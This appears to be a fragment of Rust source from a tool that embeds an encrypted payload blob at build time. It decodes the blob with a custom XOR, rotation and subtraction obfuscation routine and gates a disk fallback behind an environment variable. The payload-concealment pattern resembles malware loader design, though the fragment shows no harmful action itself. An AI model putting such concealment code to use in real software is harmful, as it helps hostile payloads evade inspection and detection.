#[inline]
pub fn get_embedded_payload() -> Option<Vec<u8>> {
    #[cfg(feature = "embedded_payload")]
    {
        Some(decrypt_payload(include_bytes!(concat!(
            env!("OUT_DIR"),
            "/payload.blob"
        ))))
    }
    #[cfg(not(feature = "embedded_payload"))]
    {
        None
    }
}

#[allow(dead_code)]
pub fn decrypt_payload(bytes: &[u8]) -> Vec<u8> {
    use crate::build_config::OBFUSCATION_KEY;

    if bytes.is_empty() {
        return Vec::new();
    }

    bytes
        .iter()
        .enumerate()
        .map(|(i, &b)| {
            let key_byte = OBFUSCATION_KEY[i % OBFUSCATION_KEY.len()];
            (b ^ key_byte)
                .rotate_right((i % 8) as u32)
                .wrapping_sub((i.wrapping_mul(13)) as u8)
        })
        .collect()
}

#[inline]
pub fn allow_disk_fallback() -> bool {
    #[cfg(debug_assertions)]
    {
        true
    }
    #[cfg(not(debug_assertions))]
    {
        env::var_os("IXODES_ALLOW_DISK").is_some()
    }
}
